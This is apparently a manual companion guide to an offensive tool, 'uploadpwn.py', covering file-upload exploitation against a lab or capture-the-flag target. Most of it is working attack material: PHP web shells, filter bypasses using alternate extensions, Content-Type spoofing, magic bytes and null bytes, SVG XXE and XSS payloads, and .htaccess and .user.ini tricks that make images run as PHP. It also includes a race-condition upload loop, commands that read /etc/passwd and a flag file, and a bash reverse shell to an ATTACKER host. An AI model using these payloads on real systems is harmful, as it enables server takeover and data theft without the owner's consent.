# UPLOADPWN — Manual Reproduction Guide

This guide walks through every technique `uploadpwn.py` automates, so you can
reproduce each step **by hand** with `curl` / Burp Repeater. Use it when the
tool fingerprints a filter and you want to understand exactly what it sent, or
when you need to operate on a target where the automation can't run (segmented
network, custom auth, weird WAF, etc.).

The example values below mirror the run that produced `uploadpwn_report.json`:

```
Target       : http://192.168.134.187
Upload URL   : http://192.168.134.187/Ticket.php
Field name   : the_file
Upload dir   : /uploads/
```

Replace those with your own. Every command is one HTTP request — no magic.

---

## 0. Setup — Identify the upload form

Before any bypass, locate the upload endpoint and the multipart field name.

```bash
# Fetch the page and look for <input type="file" name="...">
curl -s http://TARGET/Ticket.php | grep -Ei 'enctype|type="file"|<form'
```

You need three things:
1. **Action URL** — where the form POSTs (the upload endpoint).
2. **Field name** — the `name=` of the `<input type="file">` (here: `the_file`).
3. **CSRF token / cookies** — grab any hidden inputs and session cookies.

If you have a session, save cookies to a jar:
```bash
curl -c cookies.txt -b cookies.txt http://TARGET/login.php ...
```

---

## 1. PROBE — Fingerprint the filters

Goal: figure out *what* is blocked before you spend payloads.

### 1.1 Direct `.php` upload (baseline)
```bash
echo '<?php echo "PROBE_OK"; system($_GET["cmd"]); ?>' > shell.php

curl -b cookies.txt -F "the_file=@shell.php" http://TARGET/Ticket.php
# Then check if it lives:
curl http://TARGET/uploads/shell.php?cmd=id
```
- **Accepted + executes** → no filtering, you're done. Skip to §6.
- **Rejected** → continue probing.

### 1.2 Alternate PHP extensions
PHP runs more than just `.php`. Try each:
```
.phtml   .pht   .phar   .php3   .php4   .php5   .php7   .phps
.inc     .pl    .cgi    .asp    .aspx   .jsp    .jspx
```
```bash
cp shell.php shell.phtml
curl -b cookies.txt -F "the_file=@shell.phtml" http://TARGET/Ticket.php
curl http://TARGET/uploads/shell.phtml?cmd=id
```
A `.phtml` accept (like in the report) means the **blacklist is incomplete** —
they blocked `.php` but forgot the aliases.

### 1.3 Case / trailing-char tricks (blacklist regex flaws)
```
shell.PhP        # case
shell.php.       # trailing dot — Windows / mod_rewrite strips
shell.php%20     # trailing space (URL-encoded)
shell.php::$DATA # NTFS alternate data stream
shell.php/.      # path-trick
shell.php5.jpg   # double-ext, server picks first matching
```

### 1.4 Content-Type spoof
The server may only sniff the `Content-Type` header of the multipart part.
```bash
curl -b cookies.txt \
  -F "the_file=@shell.php;type=image/jpeg" \
  http://TARGET/Ticket.php
```
This is the **"CT-spoof to image/jpeg"** step in the report.

### 1.5 Magic-bytes / MIME sniff bypass
Server runs `file(1)` or checks magic bytes. Prepend a header that fools it:
```bash
# GIF
( printf 'GIF89a;\n'; cat shell.php ) > shell.gif.php
# PNG
( printf '\x89PNG\r\n\x1a\n'; cat shell.php ) > shell.png.php
# JPEG
( printf '\xff\xd8\xff\xe0'; cat shell.php ) > shell.jpg.php
```
PHP ignores the binary preamble; the parser still finds the `<?php` tag.

### 1.6 Null-byte truncation (old PHP <5.3.4)
```bash
# Filename: shell.php%00.jpg  → server sees .jpg, OS truncates at NUL → shell.php
curl -b cookies.txt \
  -F $'the_file=@shell.php;filename=shell.php\x00.jpg' \
  http://TARGET/Ticket.php
```
If it lands as `shell.php`, you have a legacy PHP target.

### 1.7 Polyglot (image + PHP)
Real GIF/PNG/JPEG that is *also* valid PHP. See `polyglots.py` in this repo
for prebuilt blobs. Useful when the server actually parses the image (e.g.
re-encodes thumbnails).

---

## 2. SVG — XXE & stored XSS surface

If `.svg` uploads are accepted (probe step in report), you get two free wins:

### 2.1 SVG → XXE file read
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY x SYSTEM "file:///flag.txt"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
  <text x="0" y="20">&x;</text>
</svg>
```
```bash
curl -b cookies.txt -F "the_file=@xxe.svg" http://TARGET/Ticket.php
# Open the rendered SVG; the entity is expanded in <text>
curl http://TARGET/uploads/xxe.svg
```
Source disclosure variant (PHP wrapper, base64 because raw `<?php` breaks XML):
```xml
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
```

### 2.2 SVG → stored XSS
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

---

## 3. `.htaccess` / `.user.ini` / `php.ini` — Re-route the parser

This is the trick that succeeded in the captured report (`addtype_jpg`). When
`.php` is hard-blocked but other extensions land, **tell Apache to parse them
as PHP**.

### 3.1 Upload an `.htaccess`
```apache
# file: .htaccess
AddType application/x-httpd-php .jpg
```
```bash
curl -b cookies.txt -F "the_file=@.htaccess" http://TARGET/Ticket.php
```
Now any `*.jpg` in that directory is executed as PHP.

### 3.2 Upload the "image" shell
```bash
( printf 'GIF89a;\n'; echo '<?php system($_GET["cmd"]); ?>' ) > shell.jpg
curl -b cookies.txt -F "the_file=@shell.jpg;type=image/jpeg" \
  http://TARGET/Ticket.php

curl 'http://TARGET/uploads/shell.jpg?cmd=id'
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 3.3 Other `.htaccess` directives worth trying
```apache
SetHandler application/x-httpd-php           # all files → PHP
AddHandler php5-script .gif
AddType application/x-httpd-php .png .gif .jpeg
php_flag engine on
Options +Indexes +ExecCGI
```

### 3.4 `.user.ini` (PHP-FPM, no Apache needed)
```ini
auto_prepend_file = shell.jpg
```
Then upload `shell.jpg` containing PHP. Every `.php` in that directory will
prepend your shell — useful when the app has its own legitimate `.php` files.

---

## 4. Bypass a size limit

The report flagged a **File Size Limit** as `present` (not bypassed). Options:

- Use the smallest possible shell:
  ```php
  <?=`$_GET[0]`?>
  ```
  19 bytes. Run with `?0=id`.
- Split the payload across two uploads and `include()` one from the other
  via `.htaccess` `auto_prepend_file`.
- Truncate via `Content-Length` mismatch (rare — depends on parser).

---

## 5. Race-condition / TOCTOU upload

If the server uploads → scans → deletes, race the scan:
```bash
# Tab 1: upload in a loop
while true; do
  curl -s -b cookies.txt -F "the_file=@shell.php" http://TARGET/Ticket.php >/dev/null
done

# Tab 2: hammer the file
while true; do
  curl -s http://TARGET/uploads/shell.php?cmd=id | grep -q uid && break
done
```

---

## 6. Trigger the RCE & exfil

Once you have a live shell URL:
```bash
SHELL='http://TARGET/uploads/shell.jpg'

curl "$SHELL?cmd=id"
curl "$SHELL?cmd=cat+/flag.txt"
curl --data-urlencode "cmd=cat /etc/passwd" "$SHELL"      # if POST shell
```

Reverse shell:
```bash
# Listener
nc -lvnp 4444

# Trigger (bash -i works on most Linux targets)
curl "$SHELL" --data-urlencode \
  'cmd=bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'
```

Upgrade the tty:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z ; stty raw -echo ; fg ; export TERM=xterm
```

---

## 7. Cleanup after the engagement

The report leaves artifacts on the target:
```
/Ticket.php (uploaded .htaccess)
/uploads/shell.jpg
```
Manual removal via your shell:
```bash
curl "$SHELL?cmd=rm+-f+/var/www/html/uploads/.htaccess+/var/www/html/uploads/shell.jpg"
```
Or rerun the tool with `--cleanup`.

---

## 8. Quick decision tree

```
Upload .php  ────────► accepted? ─► DONE (§1.1)
                       │
                       └► .phtml/.php5 accepted? ─► DONE
                          │
                          └► CT-spoof works? ─► combine w/ alt-ext
                             │
                             └► magic bytes required? ─► GIF89a + .phtml
                                │
                                └► only images allowed?
                                   ├► .htaccess writable? ─► §3 (AddType)
                                   ├► .user.ini writable? ─► §3.4
                                   └► SVG accepted?       ─► §2 (XXE/XSS)
```

---

## 9. Mapping report events → manual steps

| Report event                                     | Manual section |
|--------------------------------------------------|----------------|
| `.php accepted directly`                         | §1.1           |
| `.phtml accepted → blacklist incomplete`         | §1.2           |
| `CT-spoof to image/jpeg bypasses CT filter`      | §1.4           |
| `MIME Filter bypassed via GIF89a magic bytes`    | §1.5           |
| `Extension Filter bypassed via null byte`        | §1.6           |
| `SVG allowed → XXE/XSS surface`                  | §2             |
| `Upload accepted: .htaccess`                     | §3.1           |
| `.htaccess bypassed via addtype_jpg`             | §3.2           |
| `File Size Limit present`                        | §4             |
| `RCE via shell.jpg shell=standard`               | §6             |

---

**Reminder:** only run any of this against systems you are authorized to test.
The `--i-am-authorized` flag in the tool is not a legal shield — your scope
document is.
